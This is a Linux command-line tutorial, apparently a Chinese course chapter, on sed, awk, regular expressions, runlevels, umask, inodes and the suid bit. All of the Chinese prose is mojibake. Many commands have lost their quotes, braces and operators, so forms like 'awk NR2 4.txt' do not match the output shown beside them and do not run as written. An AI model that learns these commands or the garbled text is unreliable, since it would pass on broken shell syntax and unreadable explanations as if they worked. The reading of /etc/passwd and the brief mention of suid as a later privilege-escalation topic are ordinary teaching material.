sedè¿‡æ»¤ç›¸æ¯”grepæ¥è¯´ï¼Œå°±æ¯”è¾ƒéº»çƒ¦ã€‚æ‰€ä»¥ï¼Œè¿‡æ»¤æˆ‘ä»¬ä¸€èˆ¬ç”¨grepã€‚ [root@localhost ~]# sed -n /tcp/p test.txt # ä¹Ÿèƒ½è¿‡æ»¤å‡ºtcpæ‰€åœ¨çš„è¡Œ è¿™ä¸ªæˆ‘ä»¬ç”¨çš„å…¶å®å¾ˆå°‘ï¼Œæ‰€ä»¥å¤§å®¶ç®€å•å­¦ä¹ ä¸€ä¸‹å³å¯ã€‚ 2-1 åˆ é™¤åŒ¹é…è¡Œæ•°æ®# sedåˆ é™¤åŒ¹é…çš„è¡Œæ•°æ® [root@localhost ~]# sed /tcp/d test.txt # åˆ é™¤æ‰€æœ‰å¸¦tcpçš„è¡Œï¼Œå¹¶ä¸æ˜¯åˆ é™¤åŸæ–‡ä»¶ä¸­çš„æ•°æ®ï¼Œè€Œæ˜¯å°†åˆ é™¤ä¹‹åçš„ç»“æœæ‰“å°å‡ºæ¥äº†ã€‚ # æ‰€ä»¥åªéœ€è¦ä¸€ä¸ªé‡å®šå‘ï¼Œå°±æ‹¿åˆ°åˆ é™¤ä¹‹åçš„ç»“æœäº† [root@localhost ~]# sed /tcp/d test.txt 2.txt [root@localhost ~]# cat -n 2.txt # -iå°±å¯ä»¥ç›´æ¥åˆ é™¤åŸæ–‡ä»¶çš„æ•°æ® [root@localhost ~]# sed -i /tcp/d test.txt [root@localhost ~]# cat -n test.txt [root@localhost ~]# sed -i /udp/d test.txt [root@localhost ~]# cat -n test.txt [root@localhost ~]# sed /^#/d test.txt # åˆ é™¤ä»¥#å¼€å¤´çš„è¡Œï¼Œ^è¡¨ç¤ºä»¥ä»€ä¹ˆå¼€å¤´çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œæˆ‘æ²¡æœ‰åŠ -iæ˜‚ 2-2 æŒ‡å®šè¡Œæ¥åˆ é™¤# æŒ‡å®šè¡Œå·æ¥åˆ é™¤ [root@localhost ~]# sed 1,10d test.txt # åˆ é™¤1-10è¡Œçš„æ•°æ® [root@localhost ~]# sed -i 1,10d test.txt # åªè¦1-5è¡Œçš„æ•°æ® [root@localhost ~]# sed -n 1,5p test.txt # åªè¦ç¬¬5è¡Œçš„æ•°æ® [root@localhost ~]# sed -n 5p test.txt 2-3 æ’å…¥æ•°æ®# æ’å…¥æ•°æ® # åœ¨ç¬¬ä¸‰è¡Œåé¢æ’å…¥ä¸€è¡Œæ•°æ® [root@localhost ~]# sed 3a hello jaden 1.txt 1 2c 3a hello jaden 4b 5a # åœ¨ç¬¬2è¡Œå‰é¢æ’å…¥ä¸€è¡Œæ•°æ® [root@localhost ~]# sed 2i hello jaden 1.txt 1 hello jaden 2c 3a 4b 5a # åŠ ä¸Š-iå‚æ•°å°±èƒ½ç›´æ¥ä¿®æ”¹åŸæ–‡ä»¶ [root@localhost ~]# sed -i 2i hello jaden 1.txt [root@localhost ~]# cat 1.txt 1 hello jaden 2c 3a 4b 5a 2-4 æ›¿æ¢æ•°æ®# æ›¿æ¢æ•°æ® # æŠŠ3aæ›¿æ¢æˆwuLAOBAN [root@localhost ~]# sed s#3a#wuLAOBAN# 1.txt 1 hello jaden 2c wuLAOBAN 4b 5a [root@localhost ~]# sed -i s#3a#wuLAOBAN# 1.txt [root@localhost ~]# cat 1.txt 1 hello jaden 2c wuLAOBAN 4b 5a # æŠŠAæ›¿æ¢æˆxxxï¼Œæ¯è¡Œåªæ›¿æ¢ä¸€æ¬¡ï¼ŒåŒä¸€è¡Œçš„ç¬¬äºŒä¸ªåŠä¹‹åçš„Aéƒ½ä¸è¿›è¡Œæ›¿æ¢ [root@localhost ~]# sed s#A#xxx# 1.txt 1 hello jaden 2c wuLxxxOBAN 4b 5a # æŠŠæ‰€æœ‰çš„Aéƒ½æ›¿æ¢æˆxxx [root@localhost ~]# sed s#A#xxx#g 1.txt 1 hello jaden 2c wuLxxxOBxxxN 4b 5a # æŠŠæ‰€æœ‰çš„Aå’Œaéƒ½æ›¿æ¢æˆxxxï¼Œå¿½ç•¥å¤§å°å†™ï¼Œå‚æ•°I [root@localhost ~]# sed s#A#xxx#gI 1.txt 1 hello jxxxden 2c wuLxxxOBxxxN 4b 5xxx # -rå‚æ•°ä¹Ÿæ˜¯å’Œæ­£åˆ™æ­é…æ¥ç”¨çš„ï¼Œgrepæ˜¯-Eå’Œ-På‚æ•°ï¼Œæˆ‘ä»¬è®²å®Œæ­£åˆ™ä¹‹åå†è¯´ã€‚ 2.22.3 awk#æ“…é•¿å–åˆ—## ç”¨æ³•ï¼Œå–åˆ—## æ¯”å¦‚3.txtå†…å®¹å¦‚ä¸‹ï¼š 2 this is a test 3 Do you like awk Thiss a test 10 There are orange,apple,mongo ## ä¾‹å­1ï¼š å–åˆ— [root@localhost ~]# vi 3.txt [root@localhost ~]# cat 3.txt 2 this is a test 3 Do you like awk Thiss a test 10 There are orange,apple,mongo [root@localhost ~]# awk print $1 3.txt 2 3 Thiss 10 [root@localhost ~]# awk print $3 3.txt # å–ç¬¬ä¸‰åˆ— [root@localhost ~]# awk print $NF 3.txt # å–æ¯ä¸€è¡Œçš„æœ€åä¸€åˆ—ï¼ŒNFæ˜¯å›ºå®šå†™æ³• test awk test orange,apple,mongo [root@localhost ~]# awk print $1,$NF 3.txt # å–ç¬¬ä¸€åˆ—å’Œæœ€åä¸€åˆ— 2 test 3 awk Thiss test 10 orange,apple,mongo [root@localhost ~]# awk print $NF,$1 3.txt # è¿˜å¯ä»¥åç€å†™ï¼Œæ‰€ä»¥é€šè¿‡awkï¼Œå¯ä»¥å°†åˆ—é¡ºåºé‡æ–°æ’ç‰ˆ [root@localhost ~]# awk print $1,$4 jaden.txt # å–å‡ºç¬¬ä¸€åˆ—å’Œç¬¬å››åˆ— ## ä¾‹å­2ï¼šè®¡ç®— vi 4.txtï¼Œå†™ä¸Šå¦‚ä¸‹å†…å®¹ # æ°´æœï¼Œæ¯æ–¤å¤šå°‘é’±ï¼Œæ€»å…±å¤šå°‘æ–¤ orange 10 20 apple 20 30 mongo 50 10 banana 5 200 # å¼€å§‹è®¡ç®— [root@localhost ~]# awk print $1,$2*$3 4.txt orange 200 apple 600 mongo 500 banana 1000 # è¿˜å¯ä»¥åŠ å¤‡æ³¨ä¿¡æ¯ï¼š [root@localhost ~]# awk print $1æ€»ä»·ä¸ºï¼š,$2*$3å…ƒ 4.txt orangeæ€»ä»·ä¸ºï¼š 200å…ƒ appleæ€»ä»·ä¸ºï¼š 600å…ƒ mongoæ€»ä»·ä¸ºï¼š 500å…ƒ bananaæ€»ä»·ä¸ºï¼š 1000å…ƒ # ä¾‹å­3ï¼šæ ¹æ®è¡Œå·æ¥ç­›é€‰å†…å®¹ # a = 1è¡¨ç¤ºå˜é‡èµ‹å€¼ï¼Œè®©a=1 # a == 1ï¼Œè¡¨ç¤ºåˆ¤æ–­ä¸€ä¸‹açš„å€¼æ˜¯ä¸æ˜¯ç­‰äº1ï¼Œç­‰äº1é‚£ä¹ˆæ¡ä»¶åˆ¤æ–­ç»“æœä¸ºçœŸï¼Œä¸ç­‰1é‚£ä¹ˆæ¡ä»¶åˆ¤æ–­ç»“æœä¸ºå‡ # æ”¯æŒç¬¦å·ï¼š == = = [root@localhost ~]# awk NR==1 4.txt # å–å‡ºç¬¬ä¸€è¡Œæ•°æ®ï¼Œgrepä¸ä¼šå–å‡ºç‰¹å®šçš„è¡Œï¼Œåªèƒ½ç­›é€‰æŸäº›è¡Œ orange 10 20 [root@localhost ~]# awk NR2 4.txt # å–å‡ºè¡Œå·å¤§äº2çš„è¡Œæ•°æ® mongo 50 10 banana 5 200 [root@localhost ~]# awk NR=3 4.txt # å–å‡ºè¡Œå·å°äºç­‰äº3çš„è¡Œæ•°æ® orange 10 20 apple 20 30 mongo 50 10 [root@localhost ~]# awk NR=3 NR1 4.txt # å–å‡ºè¡Œå·å¤§äº1å¹¶ä¸”å°äºç­‰äº3çš„è¡Œ apple 20 30 mongo 50 10 # è¿˜å¯ä»¥å–è¡Œçš„åŒæ—¶æ¥å–åˆ— [root@localhost ~]# awk NR=3print $1 4.txt orange apple mongo # ä¾‹å­4ï¼š # è¿˜å¯ä»¥è¿‡æ»¤å‡ºæŒ‡å®šçš„è¡Œï¼Œawkä¹Ÿèƒ½åšè¿‡æ»¤ï¼Œä½†æ˜¯ [root@localhost ~]# awk /apple/ 4.txt # å–å‡ºå«æœ‰appleæ•°æ®çš„è¡Œæ•°æ® apple 20 30 # grepã€sedã€awkè¿‡æ»¤å¯¹æ¯” grep apple 4.txt sed -n 1,2p 4.txt awk NR1 NR=3 4.txt # ä¾‹å­5ï¼š # å†æ¯”å¦‚æˆ‘ä»¬åˆšæ‰å–ipåœ°å€ï¼šæ¯”ç›´æ¥å†™æ­£åˆ™è¦æ–¹ä¾¿å¾ˆå¤š [root@localhost log]# grep Failed password secure Mar 25 18:20:48 localhost sshd[16905]: Failed password for root from 192.168.61.1 port 55577 ssh2 Mar 25 18:49:26 localhost sshd[1498]: Failed password for root from 192.168.2.113 port 49991 ssh2 [root@localhost log]# grep Failed password secure|awk print $11 192.168.61.1 192.168.2.113 192.168.2.116# ä¾‹å­6ï¼š æŒ‡å®šåˆ†éš”ç¬¦ï¼Œé»˜è®¤æ˜¯æŒ‰ç…§ç©ºæ ¼ä½œä¸ºåˆ†éš”ç¬¦çš„ awk -F : print $7,$1 /etc/passwd # è¿™ä¸ªæ–‡ä»¶éƒ½æ˜¯ç”¨:åšçš„åˆ†éš”ç¬¦ [root@localhost ~]# awk -F : NR==3 || NR==5 print $1 /etc/passwd # å–å‡ºç¬¬ä¸‰è¡Œå’Œç¬¬äº”è¡Œçš„ç¬¬ä¸€åˆ—æ•°æ®ï¼Œåˆ†éš”ç¬¦ä¸º: daemon lp # è¡¨ç¤ºandï¼Œä¸¤ä¸ªæ¡ä»¶åŒæ—¶æˆç«‹ # ||è¡¨ç¤ºorï¼Œæ»¡è¶³ä¸€ä¸ªæ¡ä»¶å³å¯ # ä¾‹å­7ï¼š æ‹¼å‡‘æŒ‡å®šæ–‡æœ¬,åŒå¼•å·ä¹‹é—´åŸæ ·è¾“å‡º # awk -F : print $1:123:$7 /etc/passwd [root@localhost ~]# awk -F : print $1:123:$7 /etc/passwd root:123:/bin/bash bin:123:/sbin/nologin # ä¾‹å­8: è¿‡æ»¤æ–‡æœ¬ # awk -F [ /]+ $2~/^47/ 1.txt # æ‰¾å‡ºç¬¬ä¸€åˆ—æ•°æ®ä¸­å¸¦hçš„ï¼Œå¹¶å–å‡ºç¬¬ä¸€åˆ—å’Œç¬¬ä¸ƒåˆ—çš„æ•°æ® [root@localhost ~]# awk -F : $1~/h/print $1,$7 /etc/passwd shutdown /sbin/shutdown halt /sbin/halt sshd /sbin/nologin chrony /sbin/nologin apache /sbin/nologin 2.23 æ­£åˆ™è¡¨è¾¾å¼1) ^ ## è¡¨ç¤ºæœç´¢ä»¥ä»€ä¹ˆå¼€å¤´ã€‚2) $ ## è¡¨ç¤ºæœç´¢ä»¥ä»€ä¹ˆç»“å°¾ã€‚3) ^$ ##è¡¨ç¤ºç©ºè¡Œï¼Œä¸æ˜¯ç©ºæ ¼ã€‚4) . ## ä»£è¡¨ä¸”åªèƒ½ä»£è¡¨ä»»æ„ä¸€ä¸ªå­—ç¬¦ã€‚5) \\ ## è½¬ä¹‰å­—ç¬¦ï¼Œè®©æœ‰ç€ç‰¹æ®Šèº«ä»½æ„ä¹‰çš„å­—ç¬¦ï¼Œè„±æ‰é©¬ç”²ï¼Œè¿˜åŸåŸå‹ã€‚ ## ä¾‹å¦‚ï¼š\\.åªè¡¨ç¤ºå°æ•°ç‚¹ï¼Œè¿˜åŸåŸå§‹å°æ•°ç‚¹çš„æ„ä¹‰ã€‚6) * ## é‡å¤0ä¸ªæˆ–å¤šä¸ªå‰é¢çš„ä¸€ä¸ªå­—ç¬¦ã€‚ä¸ä»£è¡¨æ‰€æœ‰äº†ã€‚7) .* ## åŒ¹é…æ‰€æœ‰çš„å­—ç¬¦ã€‚^.* ä»»æ„å¤šä¸ªå­—ç¬¦å¼€å¤´ã€‚8) [abc] ## åŒ¹é…å­—ç¬¦é›†åˆå†…ä»»æ„ä¸€ä¸ªå­—ç¬¦[a-z]9) [^abc] ## ^å†ä¸­æ‹¬å·é‡Œé¢è¡¨ç¤ºéï¼Œä¸åŒ…å«aæˆ–bæˆ–cã€‚10) n,m ## é‡å¤nåˆ°mæ¬¡ï¼Œå‰ä¸€ä¸ªå­—ç¬¦ã€‚11ï¼‰ + ## é‡å¤1æ¬¡åˆ°å¤šæ¬¡12ï¼‰ ï¼Ÿ ## é‡å¤0æ¬¡åˆ°å¤šæ¬¡ 2.23.1 å–ipçš„ä¾‹å­ï¼šip addr|grep -Eo [0-9]1,3\\.[0-9]1,3\\.[0-9]1,3\\.[0-9]1,3|sed -n 2pgrep Failed password secure |grep -Eo [0-9]1,3\\.[0-9.]+ 2.23.2 å–rootç”¨æˆ·ç™»å½•æ—¶é—´lastlog|sed -n /root/p|grep -Eo [0-9]2:[0-9]2:[0-9]2 2.24 Linuxè¿è¡Œçº§åˆ«## è¿è¡Œçº§åˆ« 0 å…³æœº## è¿è¡Œçº§åˆ« 1 å•ç”¨æˆ· ï¼Œè¿™ä¸ªç±»ä¼¼äºwindowså®‰å…¨æ¨¡å¼ï¼Œå¯ä»¥ç”¨äºæ‰¾å›å¯†ç ç­‰æ“ä½œã€‚## è¿è¡Œçº§åˆ« 2 ä¸å¸¦ç½‘ç»œçš„å¤šç”¨æˆ· ï¼Œè¿™ç§æ˜¯ä¸èƒ½è”ç½‘çš„ã€‚## è¿è¡Œçº§åˆ« 3 å®Œæ•´çš„å¤šç”¨æˆ·æ¨¡å¼ multi-user.target ï¼Œ æˆ‘ä»¬å¹³å¸¸ä½¿ç”¨çš„æ¨¡å¼## è¿è¡Œçº§åˆ« 4 ä¿ç•™## è¿è¡Œçº§åˆ« 5 æ¡Œé¢æ¨¡å¼ graphical.target ï¼Œ æ¡Œé¢ç‰ˆç³»ç»Ÿå°±æ˜¯è¿™ä¸ªæ¨¡å¼ï¼Œå¦‚æœä¸æƒ³å¼€æœºè¿›å…¥å›¾å½¢åŒ–ç•Œé¢ï¼Œå°±éœ€è¦ä¿®æ”¹è¿è¡Œçº§åˆ«ï¼Œå¯ä»¥è¯•ä¸€ä¸‹## 3è¿è¡Œçº§åˆ« 6 é‡å¯## centos6æ˜¯é€šè¿‡æ•°å­—æ¥è®¾ç½®ï¼Œcentos7éƒ½ä¸æ˜¯ç”¨æ•°å­—äº†ï¼Œè€Œæ˜¯ç”¨ä¸‹é¢çš„æ–¹å¼ï¼Œä¸è¿‡æ•°å­—è®¾ç½®ä¾ç„¶æœ‰æ•ˆï¼š 2.24.1 æŸ¥çœ‹è¿è¡Œçº§åˆ«#åˆ‡æ¢è¿è¡Œçº§åˆ« init # æ‰§è¡Œinit 6ï¼Œå°±ä¼šé‡å¯ï¼Œæ‰§è¡Œinit 0å°±ä¼šå…³æœº 2.24.2 æŸ¥çœ‹è¿è¡Œçº§åˆ«## æŸ¥çœ‹è¿è¡Œçº§åˆ« runlevelsystemctl get-default ##è®¾ç½®è¿è¡Œçº§åˆ«ï¼Œè®¾ç½®ä¹‹åä¸€é‡å¯å°±æ”¹å˜äº† systemctl set-default graphical.target #è®¾ç½®é»˜è®¤è¿è¡Œçº§åˆ«ä¸ºå›¾å½¢ï¼Œæ³¨æ„æ²¡æœ‰å®‰è£…å›¾å½¢åŒ–ç•Œé¢## å·¥å…·çš„è¯æ˜¯ä¸èƒ½åˆ‡æ¢ä¸ºæ¡Œé¢ç‰ˆçš„ systemctl set-default multi-user.target #è®¾ç½®é»˜è®¤è¿è¡Œçº§åˆ«ä¸ºå‘½ä»¤è¡Œ 2.24.3 å•ç”¨æˆ·æ¨¡å¼ä¿®æ”¹å¯†ç ## å¹³æ—¶ç”¨ä¸åˆ°ï¼Œç”¨åˆ°çš„æ—¶å€™ç½‘ä¸Šæœä¸€ä¸‹å³å¯ 2.24.4 æƒé™æ©ç ## æŸ¥çœ‹æ©ç å€¼umask[root@localhost ~]# umask 0022 ## è¿™ä¸ªå€¼å°±å†³å®šç€æˆ‘ä»¬åˆ›å»ºæ–‡ä»¶çš„åˆå§‹æƒé™ï¼Œæ¯”å¦‚æˆ‘ä»¬åˆ›å»ºä¸ªç›®å½•å’Œæ–‡ä»¶ï¼Œå¦‚ä¸‹ [root@localhost ~]# mkdir jaden [root@localhost ~]# touch wulaoban.txt [root@localhost ~]# ll -h æ€»ç”¨é‡ 4.0K -rw-------. 1 root root 1.3K 3æœˆ 15 20:14 anaconda-ks.cfg drwxr-xr-x 2 root root 6 3æœˆ 27 09:29 jaden -rw-r--r-- 1 root root 0 3æœˆ 27 09:29 wulaoban.txt# å¯ä»¥çœ‹åˆ°ï¼Œç›®å½•çš„åˆå§‹æƒé™ä¸º755ï¼Œæ–‡ä»¶çš„åˆå§‹æƒé™ä¸º644ã€‚è¿™äº›æƒé™éƒ½æ˜¯é€šè¿‡umaskæ©ç è®¡ç®—å¾—æ¥çš„ã€‚# æ–‡ä»¶æƒé™è®¡ç®—ï¼š0666-0022 = 0644# ç›®å½•æƒé™è®¡ç®—ï¼š0777-0022 = 0755## æˆ‘ä»¬è¿˜å¯ä»¥ä¿®æ”¹æ©ç å€¼æ¥æ§åˆ¶åˆå§‹æ–‡ä»¶å’Œæ–‡ä»¶å¤¹çš„æƒé™ï¼š #ä¿®æ”¹æ–‡ä»¶vim /etc/profileï¼Œæ‰¾åˆ°umaskæ¥ä¿®æ”¹ root é»˜è®¤æƒé™æ©ç  022 æ™®é€šç”¨æˆ· é»˜è®¤æƒé™æ©ç  002 æ¯”å¦‚æˆ‘ä»¬å…ˆä¿®æ”¹ä¸€ä¸‹rootçš„æƒé™æ©ç ï¼Œæ”¹ä¸º044å…ˆçœ‹çœ‹æ•ˆæœã€‚ ä¿å­˜é€€å‡ºï¼Œç„¶åé‡æ–°ç™»å½•ä¸€ä¸‹å°±ç”Ÿæ•ˆäº†ï¼Œå†çœ‹umaskçš„å€¼ å†æ¬¡åˆ›å»ºæ–‡ä»¶ï¼Œçœ‹ä¸€ä¸‹åˆå§‹æƒé™ã€‚ [root@localhost ~]# touch wu1.txt[root@localhost ~]# mkdir ja1[root@localhost ~]# ll -h æ€»ç”¨é‡ 4.0K -rw-------. 1 root root 1.3K 3æœˆ 15 20:14 anaconda-ks.cfg drwx-wx-wx 2 root root 6 3æœˆ 27 09:38 ja1 drwxr-xr-x 2 root root 6 3æœˆ 27 09:29 jaden -rw--w--w- 1 root root 0 3æœˆ 27 09:37 wu1.txt -rw-r--r-- 1 root root 0 3æœˆ 27 09:29 wulaoban.txt # å¯ä»¥çœ‹åˆ°ï¼Œæ–‡ä»¶åˆå§‹æƒé™ä¸ºï¼š0666-0044=0622ï¼Œç›®å½•çš„åˆå§‹æƒé™ä¸ºï¼š0777-0044=0733# æ‰€ä»¥é€šè¿‡ä¿®æ”¹æ©ç å¯ä»¥æ§åˆ¶æ–‡ä»¶å’Œç›®å½•çš„åˆå§‹æƒé™å€¼ã€‚ æˆ‘ä»¬å°†æ©ç å†æ”¹å›å»ï¼š å†æ¥çœ‹ä¸€ä¸‹æ™®é€šç”¨æˆ·çš„ï¼Œå…ˆåˆ›å»ºä¸ªæ™®é€šç”¨æˆ·ã€‚ [root@localhost ~]# id jaden id: jaden: no such user[root@localhost ~]# useradd jaden[root@localhost ~]# passwd jaden #å¯†ç è®¾ç½®çš„æ˜¯123 æ›´æ”¹ç”¨æˆ· jaden çš„å¯†ç  ã€‚ æ–°çš„ å¯†ç ï¼š æ— æ•ˆçš„å¯†ç ï¼š å¯†ç å°‘äº 8 ä¸ªå­—ç¬¦ é‡æ–°è¾“å…¥æ–°çš„ å¯†ç ï¼š passwdï¼šæ‰€æœ‰çš„èº«ä»½éªŒè¯ä»¤ç‰Œå·²ç»æˆåŠŸæ›´æ–°ã€‚[root@localhost ~]# id jaden uid=1000(jaden) gid=1000(jaden) ç»„=1000(jaden)[root@localhost ~]# ç„¶åæ™®é€šç”¨æˆ·ç™»å½•ä¸€ä¸‹ï¼Œåˆ›å»ºç›®å½•å’Œæ–‡ä»¶å¤¹ï¼Œçœ‹çœ‹é»˜è®¤æƒé™ [jaden@localhost ~]$ umask 0002[jaden@localhost ~]$ mkdir jaden[jaden@localhost ~]$ touch jaden.txt[jaden@localhost ~]$ ll -h æ€»ç”¨é‡ 0 drwxrwxr-x 2 jaden jaden 6 3æœˆ 27 09:44 jaden -rw-rw-r-- 1 jaden jaden 0 3æœˆ 27 09:44 jaden.txt# ç›®å½•æƒé™ä¸º: 0777-0002 = 0775# æ–‡ä»¶æƒé™ä¸º: 0666-0002 = 0664 ä¿®æ”¹æ™®é€šç”¨æˆ·çš„æ©ç å€¼ï¼Œæ³¨æ„ï¼Œç”¨rootç”¨æˆ·ä¿®æ”¹ä¸‹é¢è¿™ä¸ªé…ç½®æ–‡ä»¶ï¼Œå› ä¸ºæ™®é€šç”¨æˆ·æ²¡æœ‰æƒé™ä¿®æ”¹ï¼Œä¿®æ”¹ umaskå€¼çš„æ—¶å€™å°½é‡æ”¹ä¸ºå¶æ•°ï¼š ç„¶åæ™®é€šç”¨æˆ·é‡æ–°ç™»å½•ä¸€ä¸‹ï¼Œå†çœ‹æ•ˆæœ [jaden@localhost ~]$ umask 0004[jaden@localhost ~]$ mkdir jaden2[jaden@localhost ~]$ touch jaden2.txt[jaden@localhost ~]$ ll -h æ€»ç”¨é‡ 0 drwxrwxr-x 2 jaden jaden 6 3æœˆ 27 09:44 jaden drwxrwx-wx 2 jaden jaden 6 3æœˆ 27 09:47 jaden2 -rw-rw--w- 1 jaden jaden 0 3æœˆ 27 09:48 jaden2.txt -rw-rw-r-- 1 jaden jaden 0 3æœˆ 27 09:44 jaden.txt# ç›®å½•æƒé™ä¸º: 0777-0004 = 0773# æ–‡ä»¶æƒé™ä¸º: 0666-0004 = 0662 ## ä¸ºäº†è®©ç³»ç»Ÿå®‰å…¨æ€§é«˜ä¸€äº›ï¼Œæœ‰äº›ç³»ç»Ÿä¸€ä¸Šæ¥å°±æ”¹æ©ç ï¼Œå°†é»˜è®¤æƒé™è®¾ç½®çš„å¾ˆä½ï¼Œä½†æ˜¯æƒé™ä½æ„å‘³ç€æœ‰äº›æ“ä½œå°±å—é™ï¼Œæ‰€ä»¥ä¹Ÿä¼šå¤šä¸€äº›éº»çƒ¦ï¼Œè¿™ä¸ªå°±çœ‹ä¼ä¸šéœ€æ±‚äº†ï¼Œå¥½ï¼Œæƒé™æ©ç å°±è¯´è¿™ä¹ˆå¤šã€‚ 2.24.5 inodeå’Œblock## inode ï¼šå­˜å‚¨é™¤æ–‡ä»¶åä»¥å¤–çš„å±æ€§ï¼Œæ¯”å¦‚æ–‡ä»¶è·¯å¾„ï¼Œinodeå…¨ç§°index nodeï¼Œç´¢å¼•èŠ‚ç‚¹çš„æ„æ€ã€‚ç´¢å¼•ä¸»è¦æ˜¯ç”¨äºæ–¹ä¾¿æˆ‘ä»¬è¿›è¡Œæ–‡ä»¶æŸ¥æ‰¾çš„ã€‚æˆ‘ä»¬ä¹Ÿå«å®ƒä¸ºç›®å½•æ–‡ä»¶ã€‚## blockï¼š å­˜å‚¨æ–‡ä»¶çš„å†…å®¹ã€‚[jaden@localhost ~]$ df -h #æŸ¥çœ‹ç¡¬ç›˜ç©ºé—´æ–‡ä»¶ç³»ç»Ÿ å®¹é‡ å·²ç”¨ å¯ç”¨ å·²ç”¨% æŒ‚è½½ç‚¹devtmpfs 980M 0 980M 0% /devtmpfs 991M 0 991M 0% /dev/shmtmpfs 991M 9.6M 981M 1% /runtmpfs 991M 0 991M 0% /sys/fs/cgroup/dev/sda1 100G 2.0G 98G 2% /tmpfs 199M 0 199M 0% /run/user/0tmpfs 199M 0 199M 0% /run/user/1000[jaden@localhost ~]$ df -ih # æŸ¥çœ‹inodeç©ºé—´æ–‡ä»¶ç³»ç»Ÿ Inode å·²ç”¨(I) å¯ç”¨(I) å·²ç”¨(I)% æŒ‚è½½ç‚¹devtmpfs 245K 369 245K 1% /devtmpfs 248K 1 248K 1% /dev/shmtmpfs 248K 707 247K 1% /runtmpfs 248K 16 248K 1% /sys/fs/cgroup/dev/sda1 50M 60K 50M 1% /tmpfs 248K 1 248K 1% /run/user/0tmpfs 248K 1 248K 1% /run/user/1000## å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„è™šæ‹Ÿæœºï¼Œç¡¬ç›˜100Gï¼Œinodeç©ºé—´ä¸º50Mï¼Œæ‰€ä»¥å…¶å®ç¡¬ç›˜ä¼šåˆ’åˆ†ä¸¤ä¸ªç©ºé—´ï¼Œä¸€ä¸ªæ˜¯å­˜æ•°æ®çš„ç©ºé—´ï¼Œä¸€ä¸ªæ˜¯å­˜æ–‡ä»¶ç´¢å¼•çš„ç©ºé—´ã€‚æ¯ä¸ªæ–‡ä»¶ä¼šç”¨å¤šä¸ªblockå—æ¥å­˜å‚¨ï¼Œè¿™ä¸ªblockå°±ç±»ä¼¼äºwindowsä¸Šæˆ‘ä»¬è¯´çš„ç°‡ï¼Œæ–‡ä»¶æ•°æ®çš„æœ€å°å­˜æ”¾ç©ºé—´å•å…ƒï¼Œæ¯ä¸ªæ–‡ä»¶éƒ½ä¼šæœ‰ä¸€æ¡ç›®å½•ç´¢å¼•è®°å½•åˆ°inodeç©ºé—´ä¸­ï¼Œæ–¹ä¾¿ä»¥åæˆ‘ä»¬æ‰¾å¯»æ‰¾ä¸ªæ–‡ä»¶ ## æˆ‘ä»¬åœ¨linuxä¸Šåˆ›å»ºæ–‡ä»¶çš„æ—¶å€™ï¼Œå¯èƒ½ä¼šçœ‹åˆ°ä¸€ä¸ªæŠ¥é”™ä¿¡æ¯ï¼š No space left on device ï¼Œæ„æ€æ˜¯æ²¡æœ‰å¯ç”¨ç©ºé—´äº†ã€‚è¯´æ˜è¦ä¹ˆæ˜¯ç¡¬ç›˜ç¡®å®å­˜æ»¡äº†ï¼Œè¦ä¹ˆæ˜¯inodeç©ºé—´å­˜æ»¡äº†ï¼Œå¦‚æœæ˜¯inodeç©ºé—´å­˜æ»¡äº†ï¼Œé‚£ä¹ˆå°±å»åˆ é™¤é‚£äº›ä¸´æ—¶æ–‡ä»¶æˆ–è€…ä¸€äº›æ— ç”¨çš„ç©ºæ–‡ä»¶ã€å°æ–‡ä»¶ç­‰ç­‰æ¥æ¸…ç†inodeç©ºé—´ã€‚ 2.24.5 ç‰¹æ®Šæƒé™è®²è¿™ä¸ªçš„åŸå› æ˜¯ï¼ŒåæœŸå®‰å…¨è¯¾ç¨‹ä¸­æœ‰ä¸€ä¸ªå«åšææƒçš„æ¦‚å¿µï¼Œå¯ä»¥å€ŸåŠ©åˆ°ç‰¹æ®Šæƒé™æ¥è¿›è¡Œæƒé™æå‡ï¼Œè®©æ™® é€šç”¨æˆ·èƒ½å˜ä¸ºrootç”¨æˆ·ã€‚ 5-1 suid### suidï¼Œå°±æ˜¯æŸä¸ªå¯æ‰§è¡Œæ–‡ä»¶æœ‰superè¶…çº§ç®¡ç†å‘˜æƒé™ï¼Œè¿™ä¸ªæ–‡ä»¶æ™®é€šç”¨æˆ·ä¹Ÿèƒ½ç”¨ï¼Œå«æœ‰suidçš„æ–‡ä»¶ï¼Œå¯ä»¥è®©æ™®é€šç”¨æˆ·æ‹¥æœ‰è¯¥æ–‡ä»¶å±ä¸»çš„æ‰§è¡Œæƒé™ï¼Œä¸»è¦é’ˆå¯¹çš„æ˜¯å‘½ä»¤æ–‡ä»¶ã€‚æ¯”å¦‚ï¼šä¾‹å­1ï¼š## passwd æ˜¯ç”¨æ¥ä¿®æ”¹å¯†ç çš„ä¸€ä¸ªå‘½ä»¤æ–‡ä»¶[root@localhost ~]# passwd jaden #çœ‹ä¸€ä¸‹passwdæ–‡ä»¶çš„æƒé™ [root@localhost ~]# ll /usr/bin/passwd -rwsr-xr-x. 1 root root 27856 4æœˆ 1 2020 /usr/bin/passwd# å¯ä»¥çœ‹åˆ°ugoæƒé™ç»„åˆä¸­çš„uæƒé™rwsï¼Œè¿™ä¸ªså…¶å®å°±æ˜¯xæƒé™ï¼Œä½†æ˜¯så°±æ˜¯ç”¨æ¥æ ‡è®°è¿™ä¸ªæ–‡ä»¶æ˜¯ä¸€ä¸ªå…·æœ‰suidæƒé™çš„ç‰¹æ®Šæ‰§è¡Œæ–‡ä»¶ã€‚ç”±äºæƒé™ä½åªæœ‰9ä½ï¼Œæ‰€ä»¥ç‰¹æ®Šæƒé™çš„æ‰§è¡Œæƒé™ç”¨sä»£æ›¿äº†xã€‚# æœ‰æ‰§è¡Œæƒé™çš„æ—¶å€™æ˜¯å°å†™çš„sï¼Œå»æ‰ç”¨æˆ·çš„æ‰§è¡Œæƒé™ä¹‹åï¼Œè¿™ä¸ªåœ°æ–¹æ˜¯å¤§å†™çš„Sã€‚å¦‚ä¸‹ [root@localhost ~]# chmod u-x /usr/bin/passwd [root@localhost ~]# ll /usr/bin/passwd -rwSr-xr-x. 1 root root 27856 4æœˆ 1 2020 /usr/bin/passwd# å†å°†æ‰§è¡Œæƒé™åŠ å›æ¥ï¼Œçœ‹æ•ˆæœï¼Œåˆå˜å›äº†å°s [root@localhost ~]# ll /usr/bin/passwd -rwsr-xr-x. 1 root root 27856 4æœˆ 1 2020 /usr/bin/passwd # 